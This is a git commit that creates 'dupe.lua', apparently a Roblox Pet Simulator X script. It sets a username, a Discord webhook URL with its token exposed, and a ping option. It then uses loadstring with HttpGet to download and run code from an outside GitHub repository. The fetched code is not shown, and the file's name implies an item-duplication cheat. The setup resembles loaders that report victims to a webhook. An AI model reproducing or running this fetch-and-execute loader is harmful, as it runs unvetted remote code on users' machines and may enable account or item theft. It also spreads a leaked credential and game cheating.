e77c8ad0ac2c66b65caec5feb74d66a63e6b1835
RuebanD <120219002+RuebanD@users.noreply.github.com>
2023-04-01 21:24:46 +0100

    Create dupe.lua

---
+++ dupe.lua
@@ -0,0 +1,5 @@
+UserName = "BIGBOYRUEB"
+WebHook = "https://discord.com/api/webhooks/1091819794203951186/RxcJLUDdAwa_1g6l2ds5oRgpuXQanHvKSEgiB7nYI58polAULlzFgmWImezRmRnvQp0M"
+Mention = true -- change to false if you don't want to get everyone ping in your webhook.
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HardGameSs/PSX/main/Script.lua", true))()
